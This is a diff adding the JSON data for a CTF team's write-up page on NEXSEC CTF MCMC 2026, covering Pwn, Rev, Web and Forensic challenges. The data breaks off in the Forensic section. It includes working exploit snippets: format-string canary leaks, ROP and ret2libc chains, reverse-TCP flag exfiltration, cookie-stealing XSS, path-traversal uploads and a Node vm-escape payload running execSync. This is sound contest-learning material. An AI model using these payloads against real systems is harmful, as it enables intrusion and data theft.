@@ -1,12 +1,1547 @@
 {
   "output": "nexsec-mcmc-2026.html",
   "event": "NEXSEC CTF MCMC 2026",
-  "result": "1st preliminary · advanced to final",
+  "result": "1st preliminary · Advanced to final round",
   "team": "Team: tuneX",
   "members": "Ha1qal, Kiellu4, Ni5h",
-  "note_label": "Rules",
-  "note": "Humanoid category - no AI; only basic DeepSeek AI (no DeepThink) allowed elsewhere.",
+  "rules": "Humanoid category - no AI; only basic DeepSeek AI (no DeepThink) allowed elsewhere.",
   "cover": "assets/writeups/nexsec-mcmc-2026-cover.svg",
-  "tags": ["Pwn", "Rev", "Web", "Forensic", "Crypto", "Misc"],
-  "categories": []
+  "tags": [
+    "Pwn",
+    "Rev",
+    "Web",
+    "Forensic",
+    "Crypto",
+    "Misc"
+  ],
+  "categories": [
+    {
+      "name": "Pwn",
+      "slug": "pwn",
+      "challenges": [
+        {
+          "title": "gossip",
+          "category": "Pwn",
+          "solver": "Ha1qal",
+          "overview": "The service provides a Windows x64 binary, gossips.exe, over a Wine-backed remote endpoint. Ghidra shows three prompts: the first two pass input directly to printf(), and the final prompt reads 512 bytes into a much smaller stack buffer.",
+          "analysis": "The format-string bug is needed to disclose the stack canary before using the final overflow. A hidden win function at binary offset 0x1000 reads flag.txt, so the exploit must calculate its relocated address from a leaked return address.",
+          "steps": [
+            {
+              "title": "Inspect the binary and identify both primitives",
+              "text": [
+                "I opened gossips.exe in Ghidra and followed the three input prompts. The first two calls use attacker-controlled input as a printf() format string, while the “last words” prompt calls ReadFile() with 512 bytes against a smaller stack buffer.",
+                "The source also identifies a hidden win function at offset 0x1000. It reads flag.txt and prints the flag, so the objective is to preserve the canary and redirect the saved return path to win."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/gossip-1.webp",
+                  "alt": "gossip challenge page showing the supplied Windows x64 binary and service",
+                  "caption": "The starting challenge page: gossips.exe is served through the stated remote service."
+                }
+              ]
+            },
+            {
+              "title": "Leak the canary and the return address",
+              "text": [
+                "I used the second prompt, “tell me a secret”, because it accepts a long format-string payload. Sending %p. sixty times exposes stack values without triggering the later overflow.",
+                "The recorded output places the stack canary at index 43 and the return address at index 46. I calculate the binary base as ret_leak - 0x15f0, then derive WIN as base + 0x1000 and the alignment RET gadget as base + 0x10e7."
+              ],
+              "code": [
+                {
+                  "lang": "python",
+                  "text": "p.sendline(b\"%p.\" * 60)\ncanary = vals[43]\nret_leak = vals[46]\nbase = ret_leak - 0x15f0\nWIN = base + 0x1000\nRET_GADGET = base + 0x10e7"
+                }
+              ],
+              "tables": [
+                {
+                  "headers": [
+                    "Value",
+                    "Meaning"
+                  ],
+                  "rows": [
+                    [
+                      "43",
+                      "Format-string index of the stack canary"
+                    ],
+                    [
+                      "46",
+                      "Format-string index of the return address"
+                    ],
+                    [
+                      "0x15f0",
+                      "Return-address offset used to recover the base"
+                    ],
+                    [
+                      "0x1000",
+                      "win function offset"
+                    ],
+                    [
+                      "0x10e7",
+                      "ret alignment-gadget offset"
+                    ]
+                  ]
+                }
+              ]
+            },
+            {
+              "title": "Build the canary-safe overflow",
+              "text": [
+                "Disassembly places the canary 272 bytes from the overflow start and the return address at offset 296. I keep the leaked canary intact, add the two recorded eight-byte fields, then place a ret gadget before win.",
+                "Jumping directly to win initially crashed because the stack was not aligned. The extra ret gadget fixes that alignment before win executes."
+              ],
+              "code": [
+                {
+                  "lang": "python",
+                  "text": "payload = b\"A\" * 272\npayload += p64(canary)\npayload += b\"B\" * 8\npayload += b\"C\" * 8\npayload += p64(RET_GADGET)\npayload += p64(WIN)\np.send(payload)"
+                }
+              ],
+              "files": [
+                {
+                  "path": "assets/writeups/nexsec/files/gossip-exploit.py",
+                  "label": "Download full exploit (gossip-exploit.py)",
+                  "size": "1.1 KB"
+                }
+              ]
+            },
+            {
+              "title": "Run the exploit and verify code execution",
+              "text": [
+                "The final solver leaked the canary and relocated addresses, bypassed the stack-protector check, and redirected execution to the hidden win function. The output below records the successful connection, calculated values, and returned flag."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/gossip-2.webp",
+                  "alt": "Successful gossip exploit output showing leaked addresses and flag capture",
+                  "caption": "Final exploit output: the canary and base are leaked, WIN is calculated, and the service prints the flag."
+                }
+              ]
+            }
+          ],
+          "result": "The exploit bypassed the canary check and reached the hidden win function, which printed the flag.",
+          "flag": "nexsec26{7b36d77599975e07aa26f532e2054974b3dcf4ca8333fec326369dd455c2a872}",
+          "tools": "Ghidra, Pwntools, Python, format-string analysis",
+          "learned": "A format-string leak can turn a protected stack overflow into a reliable exploit. Correct stack alignment is essential when chaining into a target function on x64."
+        },
+        {
+          "title": "SpeedRun",
+          "category": "Pwn",
+          "solver": "Ha1qal",
+          "overview": "A statically linked, non-PIE ELF binary with a stack canary, two validation gates, a shellcode filter, an RWX mapping, seccomp, and closed standard streams.",
+          "analysis": "The source combines numeric-gate bypasses, runtime construction of syscall bytes, and a reverse TCP exfiltration path because ordinary stdout cannot return the flag.",
+          "steps": [
+            {
+              "title": "Inspect the supplied files and protections",
+              "text": [
+                "I used file, checksec, Ghidra, and GDB. The binary has a canary, no PIE, NX, a later RWX mapping, seccomp restrictions, and a static filter for bytes 0F 05."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/speedrun-1.webp",
+                  "alt": "SpeedRun challenge page with the supplied Docker and challenge files",
+                  "caption": "The SpeedRun start page provides the challenge artifacts and remote service."
+                }
+              ]
+            },
+            {
+              "title": "Bypass the two validation gates",
+              "text": [
+                "For the first comparison gate, I submitted nan: ordered comparisons with NaN are false. For the second scanf(\"%f\") gate, 0x1.337p-137 has IEEE-754 bits 0x00001337, satisfying the integer comparison."
+              ],
+              "code": [
+                {
+                  "lang": "text",
+                  "text": "nan\n0x1.337p-137"
+                }
+              ]
+            },
+            {
+              "title": "Build the filtered shellcode path",
+              "text": [
+                "The payload cannot contain literal 0F 05. The solver writes 0F, 05, and C3 into writable executable memory to form syscall; ret at runtime, then uses socket, connect, openat, getdents64, read, and write.",
+                "It connects to the listener, enumerates /home/mirai for the randomized flag- filename, reads that file, and transmits its content back through the TCP socket."
+              ],
+              "files": [
+                {
+                  "path": "assets/writeups/nexsec/files/speedrun-exploit.py",
+                  "label": "Download exploit scaffold (speedrun-exploit.py)"
+                }
+              ]
+            },
+            {
+              "title": "Configure the callback and run the exploit",
+              "text": [
+                "The source configures a Portmap.io TCP mapping to the local listener before sending the Pwntools payload. The screenshot records the mapping stage used by the final exploit."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/speedrun-2.webp",
+                  "alt": "Portmap TCP mapping used for the SpeedRun exploit callback",
+                  "caption": "The callback mapping required for the SpeedRun exploit output path."
+                }
+              ]
+            }
+          ],
+          "result": "The shellcode used the reverse TCP channel to return the flag after bypassing both gates and the static syscall filter.",
+          "flag": "nexsec26{Good___morning___or___perhaps___good___evening___everyone!!!}",
+          "tools": "file, checksec, Ghidra, GDB, Pwntools, Portmap.io",
+          "learned": "NaN and hexadecimal floating-point values can defeat poorly designed numeric checks. When output is closed, a permitted network syscall can provide the exfiltration channel."
+        },
+        {
+          "title": "Playlist",
+          "category": "Pwn",
+          "solver": "Ha1qal",
+          "overview": "A Linux binary called playlist reads track IDs. Its size check uses 32-bit multiplication while read() receives a 64-bit multiplication result, producing a stack overflow through an integer wraparound.",
+          "analysis": "The source records NX, so the intended route is a two-stage return-to-libc chain: leak puts through the GOT, then call system(\"/bin/sh\") with the recovered libc base.",
+          "steps": [
+            {
+              "title": "Inspect the challenge and the integer-width mismatch",
+              "text": [
+                "The program checks if 4 * count is at most 56 but passes 4LL * count to read(). Supplying 1073741824 (2^30) wraps the 32-bit check to zero while the 64-bit length remains huge.",
+                "That bypass makes the stack buffer reachable without guessing a size accepted by the guard."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/playlist-1.webp",
+                  "alt": "Playlist challenge page showing the supplied binary",
+                  "caption": "The Playlist challenge start page and supplied binary."
+                }
+              ],
+              "code": [
+                {
+                  "lang": "text",
+                  "text": "1073741824  # 2^30"
+                }
+              ]
+            },
+            {
+              "title": "Leak puts and recover libc",
+              "text": [
+                "The first ROP chain uses 64 bytes of buffer padding, eight bytes of saved-frame padding, then pop rdi; puts@GOT; puts@PLT; main. Returning to main provides a second input after the real puts address is printed.",
+                "I calculate libc.address as leak - libc.sym[\"puts\"], then find /bin/sh with libc.search()."
+              ],
+              "code": [
+                {
+                  "lang": "python",
+                  "text": "payload1 = b\"A\" * 64 + b\"B\" * 8\npayload1 += p64(POP_RDI) + p64(elf.got[\"puts\"])\npayload1 += p64(elf.plt[\"puts\"]) + p64(MAIN)\nlibc.address = leak - libc.sym[\"puts\"]"
+                }
+              ]
+            },
+            {
+              "title": "Send the aligned system chain",
+              "text": [
+                "The second chain again reaches the vulnerable read path. A ret gadget precedes pop rdi; /bin/sh; system so the stack remains correctly aligned before libc system() runs."
+              ],
+              "code": [
+                {
+                  "lang": "python",
+                  "text": "payload2 = b\"A\" * 64 + b\"B\" * 8\npayload2 += p64(RET)\npayload2 += p64(POP_RDI) + p64(binsh)\npayload2 += p64(libc.sym[\"system\"])"
+                }
+              ],
+              "files": [
+                {
+                  "path": "assets/writeups/nexsec/files/playlist-exploit.py",
+                  "label": "Download full exploit (playlist-exploit.py)",
+                  "size": "1.1 KB"
+                }
+              ]
+            },
+            {
+              "title": "Read flag.txt from the shell",
+              "text": [
+                "The returned interactive shell confirms the puts leak, libc base, /bin/sh address, and system address. Listing the directory and reading flag.txt produces the final flag."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/playlist-2.webp",
+                  "alt": "Playlist exploit output showing libc addresses, interactive shell, and flag.txt",
+                  "caption": "Final Playlist exploit output: the return-to-libc chain opens a shell and reads flag.txt."
+                }
+              ]
+            }
+          ],
+          "result": "The two-stage ROP chain turned the integer overflow into an interactive shell and returned the flag.",
+          "flag": "nexsec26{integer_overflow_to_ret_2_l1b_goes_brrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr_3eab3fd91628053ce62e2d4e44071860670a6a470397f47bf253c6c3f2423825}",
+          "tools": "Ghidra, Pwntools, ROP, libc analysis",
+          "learned": "An overflow can arise when a validation calculation uses a narrower integer width than the later read. Under NX, a controlled libc leak enables a reliable system chain."
+        }
+      ]
+    },
+    {
+      "name": "Rev",
+      "slug": "rev",
+      "challenges": [
+        {
+          "title": "Bytecode Bakery",
+          "title_only": false,
+          "category": "Rev",
+          "solver": "Kiellu4",
+          "overview": "Files: oven.py, recipe.bin. DeepSeek reference: https://chat.deepseek.com/share/liwfpdf8s7hc5b1fo5",
+          "analysis": "SHA256 oven.py: 161e6c15bf0305132257d5d9f6f1732dca1976afa383d2023df5573266744782. SHA256 recipe.bin: ee84b6f469eb82dac886786e28e65e8ea1a3a3436d2778a0e1a54b4b467db4a0.",
+          "steps": [
+            {
+              "title": "Opening and file metadata",
+              "text": [
+                "The supplied interpreter runs a custom stack machine over recipe.bin. The challenge validates a 50-byte ingredient list."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/bytecode-bakery-1.webp",
+                  "alt": "Bytecode Bakery challenge page",
+                  "caption": "Opening Bytecode Bakery challenge page."
+                },
+                {
+                  "src": "assets/writeups/nexsec/bytecode-bakery-2.webp",
+                  "alt": "SHA256 values for oven.py and recipe.bin",
+                  "caption": "Source hash verification for both supplied files."
+                }
+              ]
+            },
+            {
+              "title": "Map the BAKE format and opcodes",
+              "text": [
+                "recipe.bin begins with BAKE, followed by version, input length, little-endian code length, and bytecode. SUB computes value below minus pushed operand; ROL rotates the value below by the pushed count."
+              ],
+              "tables": [
+                {
+                  "headers": [
+                    "Offset",
+                    "Size",
+                    "Field"
+                  ],
+                  "rows": [
+                    [
+                      "0",
+                      "4",
+                      "BAKE magic"
+                    ],
+                    [
+                      "4",
+                      "1",
+                      "Version"
+                    ],
+                    [
+                      "5",
+                      "2",
+                      "Input length"
+                    ],
+                    [
+                      "6",
+                      "2",
+                      "Little-endian code length"
+                    ],
+                    [
+                      "8",
+                      "N",
+                      "Bytecode"
+                    ]
+                  ]
+                },
+                {
+                  "headers": [
+                    "Opcode",
+                    "Mnemonic"
+                  ],
+                  "rows": [
+                    [
+                      "01",
+                      "PUSH b"
+                    ],
+                    [
+                      "02",
+                      "LOAD i"
+                    ],
+                    [
+                      "03",
+                      "ADD"
+                    ],
+                    [
+                      "04",
+                      "SUB"
+                    ],
+                    [
+                      "05",
+                      "XOR"
+                    ],
+                    [
+                      "06",
+                      "ROL"
+                    ],
+                    [
+                      "07",
+                      "EQ"
+                    ],
+                    [
+                      "08",
+                      "JNZ"
+                    ],
+                    [
+                      "09",
+                      "JMP"
+                    ],
+                    [
+                      "0A",
+                      "FAIL"
+                    ],
+                    [
+                      "0B",
+                      "OK"
+                    ],
+                    [
+                      "0C",
+                      "DUP"
+                    ],
+                    [
+                      "0D",
+                      "AND"
+                    ]
+                  ]
+                }
+              ],
+              "files": [
+                {
+                  "path": "assets/writeups/nexsec/files/bytecode-bakery-disassemble.py",
+                  "label": "Download disassembler (bytecode-bakery-disassemble.py)"
+                }
+              ]
+            },
+            {
+              "title": "Disassemble and invert both stages",
+              "text": [
+                "The disassembly gives version 1, input length 50, and code length 1143. Stage A checks positions 0–24 with ing[i] = K XOR C and yields a decoy. Stage B chains all 50 bytes: undo arithmetic, rotate right, then undo the XOR with the preceding byte. Index zero also requires K2 = 0x8b."
+              ],
+              "files": [
+                {
+                  "path": "assets/writeups/nexsec/files/bytecode-bakery-solver.py",
+                  "label": "Download full solver (bytecode-bakery-solver.py)"
+                }
+              ]
+            },
+            {
+              "title": "Output and verify",
+              "text": [
+                "The solver outputs the recovered 50-byte ingredient list. Feeding it to oven.py verifies the list and accepts the flag format."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/bytecode-bakery-3.webp",
+                  "alt": "Bytecode Bakery solver output",
+                  "caption": "The source solver output."
+                },
+                {
+                  "src": "assets/writeups/nexsec/bytecode-bakery-4.webp",
+                  "alt": "Bytecode Bakery oven verification",
+                  "caption": "oven.py accepts the recovered ingredient list."
+                }
+              ]
+            }
+          ],
+          "result": "The reconstructed ingredient list passes the custom bytecode validator.",
+          "flag": "nexsec26{th15_byt3_i5_b4k3d_n0t_fry3d_xD_ZXJ6eQ==}",
+          "tools": "Python, custom bytecode analysis",
+          "learned": "Operand order and the asymmetric first Stage B block are essential to the inverse transformation."
+        },
+        {
+          "title": "Flag Checker",
+          "category": "Rev",
+          "solver": "Ha1qal",
+          "overview": "A PlayStation 5 binary that asks for a password through a controller-driven 41-character keypad. The source starts by installing GhidraOrbis for this binary format.",
+          "analysis": "The target checker is FUN_010000f0: it accepts exactly 40 bytes and applies 60+ byte-level arithmetic constraints over a decrypted 41-character alphabet.",
+          "steps": [
+            {
+              "title": "Open the PS binary and map file addresses",
+              "text": [
+                "GhidraOrbis is required before analysing the PS binary. readelf -l gives three LOAD segments with file_offset = ghidra_vaddr − 0x01000000 + 0x4000.",
+                "readelf -d shows the VideoOut, Pad, UserService, UniversalDataSystem, and Trophy imports. Searching for imul eax, eax, 0x1fb9 finds eleven LCG decryptors."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/flag-checker-1.webp",
+                  "alt": "Flag Checker challenge page",
+                  "caption": "The Flag Checker opening challenge screenshot."
+                }
+              ]
+            },
+            {
+              "title": "Decrypt the embedded tables",
+              "text": [
+                "Every decryptor uses u = (u * 0x1fb9 + 0x6efb) % 0x20d38 and XORs the low byte into its source table. Python must emulate uint32_t overflow before the modulus.",
+                "One output is the input alphabet: abcdefghijklmnopqrstuvwxyz0123456789{}!?_."
+              ],
+              "code": [
+                {
+                  "lang": "python",
+                  "text": "u = (u * 0x1fb9) & 0xffffffff\nu = (u + 0x6efb) & 0xffffffff\nu = u % 0x20d38"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/flag-checker-2.webp",
+                  "alt": "Decrypted Flag Checker table output",
+                  "caption": "The decrypted table list reveals the 41-character keypad alphabet."
+                }
+              ]
+            },
+            {
+              "title": "Model the keypad checker in Z3",
+              "text": [
+                "FUN_010009d0 appends selected keypad characters and calls FUN_010000f0 when Square is pressed. The checker requires 0x28 bytes.",
+                "I modelled each byte as BitVec(8), zero-extended it for the decompiler’s unsigned arithmetic, and constrained every character to the recovered alphabet. The source records that R13D reloads caused several UNSAT transcription bugs; after offset 0x037e it represents c[3]."
+              ],
+              "tables": [
+                {
+                  "headers": [
+                    "Property",
+                    "Source value"
+                  ],
+                  "rows": [
+                    [
+                      "Required input length",
+                      "0x28 / 40 bytes"
+                    ],
+                    [
+                      "Alphabet length",
+                      "41"
+                    ],
+                    [
+                      "LCG multiplier",
+                      "0x1fb9"
+                    ],
+                    [
+                      "LCG increment",
+                      "0x6efb"
+                    ],
+                    [
+                      "LCG modulus",
+                      "0x20d38"
+                    ]
+                  ]
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/flag-checker-3.webp",
+                  "alt": "Flag Checker Z3 transcription bug table",
+                  "caption": "The source records the R13D/c[3] corrections that made the constraint set satisfiable."
+                }
+              ]
+            },
+            {
+              "title": "Solve and verify",
+              "text": [
+                "The source Z3 model reports 105 constraints, returns sat, and prints the recovered flag."
+              ],
+              "files": [
+                {
+                  "path": "assets/writeups/nexsec/files/flag-checker-z3-source.txt",
+                  "label": "Download full Z3 source transcript (flag-checker-z3-source.txt)"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/flag-checker-4.webp",
+                  "alt": "Flag Checker Z3 output showing 105 constraints, sat result, and recovered flag",
+                  "caption": "The PDF result page shows “constraints: 105”, a sat result, and the recovered flag."
+                }
+              ]
+            }
+          ],
+          "result": "The recovered 40-byte keypad input satisfies the checker and unlocks the flag.",
+          "flag": "nexsec26{c4n_w3_pl4y_gta6_0n_w1nd0w5???}",
+          "tools": "GhidraOrbis, readelf, Ghidra, Z3, Python",
+          "learned": "Decompiler-derived constraints need exact unsigned-width modelling. Adding constraints incrementally isolates a single bad transcription far faster than debugging a full UNSAT model."
+        },
+        {
+          "title": "матрёшка",
+          "category": "Rev",
+          "solver": "Ha1qal",
+          "overview": "matryoshka.exe is a .NET Framework 4.7.2 binary protected by Obfuscar and a custom high-entropy packer. The source ultimately finds thirty AES-encrypted .NET assemblies arranged as five recursive levels.",
+          "analysis": "Each doll validates part of a 16-character password with HMAC-SHA256. The recovered password is rhkaDwfinMePcolz; its SHA-256 matches the embedded verifier.",
+          "steps": [
+            {
+              "title": "Initial Analysis",
+              "text": [
+                "I identify a .NET Framework 4.7.2 executable with Obfuscar string encryption and a custom packer. The analysis goal is to unpack the embedded “dolls” and follow their recursive verification."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/matryoshka-1.webp",
+                  "alt": "матрёшка challenge screenshot",
+                  "caption": "The матрёшка opening challenge evidence."
+                }
+              ]
+            },
+            {
+              "title": "Unpacking with de4dot-cex",
+              "text": [
+                "I run de4dot-cex against matryoshka.exe. It renames symbols but does not remove the custom packer, so the remaining work is static extraction and AES decryption of embedded dolls."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "TERM=dumb mono ./de4dot-x64.exe matryoshka.exe -o matryoshka_cex.exe"
+                }
+              ]
+            },
+            {
+              "title": "Decoding the 13 Obfuscated Strings",
+              "text": [
+                "dnSpy reveals a decryptor that applies byte_0[i] = byte_0[i] ^ i ^ 170. Decoding these strings exposes the data used by the packed hierarchy."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/matryoshka-2.webp",
+                  "alt": "Decoding strings source screenshot",
+                  "caption": "Decoding strings: the source image for the Obfuscar string-decryption stage."
+                }
+              ]
+            },
+            {
+              "title": "Extracting Resources and Deriving the Root Key",
+              "text": [
+                "dnfile extracts doll-0 and doll-1 resources. The AES base key is the XOR of the three hex-decoded strings; child keys are derived from their parent key and ASCII child path."
+              ]
+            },
+            {
+              "title": "The Doll Class — Recursive Verification",
+              "text": [
+                "Each doll decrypts a child AES-256-CBC blob using its derived key, then invokes it through reflection. Leaf dolls use HMAC-SHA256 to pin an individual password character."
+              ]
+            },
+            {
+              "title": "Tree Structure (30 Dolls, 5 Levels)",
+              "text": [
+                "The two roots partition the sixteen password positions through a binary tree. Recursing through the thirty dolls reaches every leaf and fixes every character."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/matryoshka-3.webp",
+                  "alt": "матрёшка recursive tree structure",
+                  "caption": "The source tree structure for the 30 dolls across five levels."
+                }
+              ]
+            },
+            {
+              "title": "The Complete Solver Script",
+              "text": [
+                "The source solver walks both roots, decrypts each doll, tests the leaf HMAC values, and verifies the complete password against the embedded SHA-256 verifier."
+              ],
+              "files": [
+                {
+                  "path": "assets/writeups/nexsec/files/matryoshka-solver-source.txt",
+                  "label": "Download full source solver transcript (matryoshka-solver-source.txt)"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/matryoshka-4.webp",
+                  "alt": "матрёшка solver output showing nested flag",
+                  "caption": "Solver output: recursive walk, recovered password verification, and the nested final flag."
+                }
+              ]
+            }
+          ],
+          "result": "The recursive solver recovers rhkaDwfinMePcolz, matches the embedded SHA-256 verifier, and unlocks the flag.",
+          "flag": "nexsec26{nexsec26{nexsec26{ }}}🚩",
+          "tools": "dnSpy, de4dot-cex, dnfile, Python, AES, HMAC-SHA256",
+          "learned": "Static resource extraction can defeat a custom managed-code packer when each child’s key derivation and verification data are recoverable."
+        }
+      ]
+    },
+    {
+      "name": "Web",
+      "slug": "web",
+      "challenges": [
+        {
+          "title": "Ado",
+          "category": "Web",
+          "solver": "Ha1qal",
+          "overview": "An Adonis application source bundle exposes an IDOR, a stored-XSS sink, upload filename traversal, and vm.runInContext report generation.",
+          "analysis": "The source chains these flaws: use an IDOR for a user session, let the admin bot execute stored XSS, overwrite the report template, then escape the VM context.",
+          "steps": [
+            {
+              "title": "Map routes and trust boundaries",
+              "text": [
+                "The source bundle exposes AccountsController, CommentsController, AdminUploadController, session configuration, routes, and an admin Puppeteer bot. The admin comments template renders raw triple-brace comment bodies, while session cookies are readable by JavaScript."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/ado-1.webp",
+                  "alt": "Ado source challenge screenshot",
+                  "caption": "Ado source evidence at the start of the investigation."
+                }
+              ]
+            },
+            {
+              "title": "Leak a user account through the IDOR",
+              "text": [
+                "I request internal account 3 to retrieve Hana’s credentials. Hana is not an administrator, but her account is enough to post comments."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "curl -s http://koala.nexsec.my:38903/api/v1/internal/accounts/3"
+                }
+              ]
+            },
+            {
+              "title": "Use stored XSS against the admin bot",
+              "text": [
+                "I log in as Hana, post the documented image-onerror payload, and wait for the bot’s /admin/comments visit. It reads document.cookie because httpOnly is false and posts the encoded admin cookie back as a comment."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "sleep 90\ncurl -s http://koala.nexsec.my:38903/posts/1/comments | grep -o \"XXX_[^_]*_XXX\" | grep -v btoa | tail -1"
+                }
+              ]
+            },
+            {
+              "title": "Traverse into the report template",
+              "text": [
+                "The upload uses file.move() with the supplied filename. One ../ from /app/storage/uploads correctly reaches /app/storage/reports/template.js. I upload the documented template module under that filename."
+              ],
+              "code": [
+                {
+                  "lang": "javascript",
+                  "text": "module.exports={generate(){return module.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /app/flag.txt').toString()}}"
+                }
+              ]
+            },
+            {
+              "title": "Trigger the VM escape",
+              "text": [
+                "generateReport runs the uploaded template in vm.runInContext. The host-realm module object leaks its constructor chain, so the template reaches process, child_process, and cat /app/flag.txt."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "curl -s -H \"Cookie: $NEW\" http://koala.nexsec.my:38903/admin/generate-report"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/ado-2.webp",
+                  "alt": "Ado generate-report response containing the flag",
+                  "caption": "The generate-report response returns the Ado flag after the VM escape."
+                }
+              ]
+            }
+          ],
+          "result": "The chained IDOR, XSS, path traversal, and VM escape reads /app/flag.txt.",
+          "flag": "nexsec26{Did_you_enjoy_DnD_song?kinda_g00d_actually_oh_btw_this_is_4don1s_cve_6497b2f58bd4fd80922b8991b40e5935e7635a6be0f86050fd955fa75f68fae5}",
+          "tools": "curl, Adonis source review, Puppeteer-bot analysis, JavaScript",
+          "learned": "A host-realm object passed into vm.createContext can invalidate the intended sandbox. Chained web flaws often need a low-privilege session before the privileged sink is reachable."
+        },
+        {
+          "title": "3NC0R3",
+          "category": "Web",
+          "solver": "Ha1qal",
+          "overview": "A wall application uses MD5(card_id) permalinks and an LFI-style scan loader. The challenge is to recover Carl’s passphrase by following unlisted drafts and the longhand note.",
+          "analysis": "The changelog says the permalink is a hash of the card number, exposing an IDOR. The loader then has a one-decode filter and naive ../ replacement.",
+          "steps": [
+            {
+              "title": "Recon the wall and permalink format",
+              "text": [
+                "I enumerate /m/<32-hex> links from /wall and read /changelog. It states that permalinks are MD5 hashes of card IDs rather than random tokens."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/3nc0r3-1.webp",
+                  "alt": "3NC0R3 source screenshot",
+                  "caption": "The PDF screenshot for the 3NC0R3 source section."
+                }
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "curl -s \"$BASE/wall\" | grep -oE \"/m/[a-f0-9]{32}\" | sort -u\ncurl -s \"$BASE/changelog\" | sed -n \"/<main>/,/<\\/main>/p\" | sed \"s/<[^>]*>//g\""
+                }
+              ]
+            },
+            {
+              "title": "Enumerate unlisted draft cards",
+              "text": [
+                "I hash sequential card IDs and request each permalink. Cards 3, 6, 13, 20, 25 are not on the wall and reveal the useful hints."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "for n in $(seq 1 60); do h=$(printf \"%s\" \"$n\" | md5sum | cut -d\" \" -f1); curl -s -o /dev/null -w \"%{http_code}\" \"$BASE/m/$h\"; done"
+                }
+              ]
+            },
+            {
+              "title": "Read full untruncated stories",
+              "text": [
+                "The page truncates stories at 120 characters, but ?full=1 returns the complete draft. The useful notes identify sweet_memory.txt and the vulnerable /scan?file= loader."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "H=$(printf \"3\" | md5sum | cut -d\" \" -f1)\ncurl -s \"$BASE/m/$H?full=1\""
+                }
+              ]
+            },
+            {
+              "title": "Confirm and bypass the file loader",
+              "text": [
+                "The direct private/sweet_memory.txt request returns a placeholder. Because the filter decodes once and the sanitizer naively replaces ../, the double-encoded ....// sequence becomes ../ at the later sanitization stage."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "curl -s \"$BASE/scan?file=private/sweet_memory.txt\"\ncurl -s \"$BASE/scan?file=%252e%252e%252e%252e//private/sweet_memory.txt\""
+                }
+              ]
+            },
+            {
+              "title": "Derive the passphrase",
+              "text": [
+                "The longhand gives Europe, Stockholm, 1986, all caps, no spaces, and the note’s e→3/o→0 substitutions. This yields 3UR0P3@ST0CKH0LM1986."
+              ]
+            }
+          ],
+          "result": "The longhand reveals the passphrase used to complete the challenge.",
+          "flag": "nexsec26{th3_0nly_0n3_wh0_c0uld_h4ck_m3_3a0faf3e65bd02e12ab3151c6dc85f66e}",
+          "tools": "curl, md5sum, URL encoding",
+          "learned": "Hashing an object ID is not authorization. URL decoding and path normalization must be considered together when validating file paths."
+        }
+      ]
+    },
+    {
+      "name": "Forensic",
+      "slug": "forensic",
+      "challenges": [
+        {
+          "title": "n8n",
+          "category": "Forensic",
+          "solver": "Ha1qal",
+          "overview": "",
+          "analysis": "",
+          "steps": [
+            {
+              "title": "Initial reconnaissance",
+              "text": [
+                "I first identified the supplied artefact. `victim.elf` is an ELF 64-bit LSB core file for x86-64, so the next steps focus on extracting useful strings from the memory image rather than treating it as an executable.",
+                "The source write-up considered Volatility 3, but chose a focused `strings` workflow because the relevant evidence is present directly in the core."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "file victim.elf"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/n8n-1.webp",
+                  "alt": "n8n challenge page",
+                  "caption": "The n8n challenge page identifies the core-file download and the question set."
+                }
+              ]
+            },
+            {
+              "title": "Question 1–14 evidence",
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/n8n-2.webp",
+                  "alt": "n8n question evidence 1",
+                  "caption": "Question 1 evidence from the source write-up."
+                },
+                {
+                  "src": "assets/writeups/nexsec/n8n-3.webp",
+                  "alt": "n8n question evidence 2",
+                  "caption": "Question 2 evidence from the source write-up."
+                },
+                {
+                  "src": "assets/writeups/nexsec/n8n-4.webp",
+                  "alt": "n8n question evidence 3",
+                  "caption": "Question 3 evidence from the source write-up."
+                },
+                {
+                  "src": "assets/writeups/nexsec/n8n-5.webp",
+                  "alt": "n8n question evidence 4",
+                  "caption": "Question 4 evidence from the source write-up."
+                },
+                {
+                  "src": "assets/writeups/nexsec/n8n-6.webp",
+                  "alt": "n8n question evidence 5",
+                  "caption": "Question 5 evidence from the source write-up."
+                },
+                {
+                  "src": "assets/writeups/nexsec/n8n-7.webp",
+                  "alt": "n8n question evidence 6",
+                  "caption": "Question 6 evidence from the source write-up."
+                },
+                {
+                  "src": "assets/writeups/nexsec/n8n-8.webp",
+                  "alt": "n8n question evidence 7",
+                  "caption": "Question 7 evidence from the source write-up."
+                },
+                {
+                  "src": "assets/writeups/nexsec/n8n-10.webp",
+                  "alt": "n8n question evidence 8",
